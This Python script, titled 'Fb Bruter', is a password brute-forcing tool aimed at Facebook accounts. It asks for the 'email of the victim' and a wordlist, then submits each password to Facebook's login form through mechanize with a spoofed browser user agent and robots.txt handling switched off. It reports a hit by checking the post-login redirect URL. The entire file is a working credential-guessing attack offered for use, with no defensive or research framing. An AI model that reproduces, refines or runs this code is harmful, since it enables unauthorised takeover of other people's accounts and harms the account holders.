import sys, mechanize, http.cookiejar
from mechanize import _http

br = mechanize.Browser()  # this opens inbuilt browser of mechanize in the program
cj = http.cookiejar.LWPCookieJar()  # this sets the cookie for browser

print('''
Welcome to Fb Bruter created by: Gaurav Giri!
 ''')

email = str(input('Enter the email of the victim:\t')).strip()

print('If exist in the same directory where the program exists only enter the name like : wordlists.txt')

wordlist = str(input('Enter the directory of the wordlists:\t'))

try:

    with open(wordlist, 'r') as wordlists:  # trying to open the wordlist text file if exists
        passwords = wordlists.readlines()

except:

    print('Wordlist doesnot exists! Please check and try again:')  # or error will be shown
    sys.exit(0)


def start(password):  # our main checking program.
    try:
        br.addheaders = [
            ('User-agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
                           'Chrome/81.0.4044.92 Safari/537.36')]  # this adds header to the browser
        br.open('https://www.facebook.com/login.php?login_attempt=1')  # this opens the link in the browswer
        br.select_form(nr=0)  # This selects the first form in the page if name exists ' br.select_form(name='formname')
        br.form['email'] = email  # This enters the value of email in the form where the form id or name is email
        br.form['pass'] = password  # This enters the value of password in the form where the  name is password
        response = br.submit()  # This submits the data on the form
        print('Trying...' + str(password))
        if response.geturl() == 'https://www.facebook.com/' or response.geturl() == 'https://www.facebook.com' \
                                                                                    '/checkpoint/?next=https%3A%2F' \
                                                                                    '%2Fwww.facebook.com%2F':
            print('Password found!\t' + password)
            sys.exit(0)  # this checks whether the entered data is correct or not. response.geturl() is response url
        else:
            return
    except KeyboardInterrupt:
        sys.exit(1)


br.set_handle_robots(False) # this handle robots.text of the site
br.set_handle_equiv(True)
br.set_handle_referer(True)
br.set_handle_redirect(True)
br.set_cookiejar(cj)    # this sets cookiejar for the browser
br.set_handle_refresh(_http.HTTPRefererProcessor(), max_time=1)
for i in range(len(passwords)):
    passwords[i] = passwords[i].strip()
for password in passwords:
    start(password)

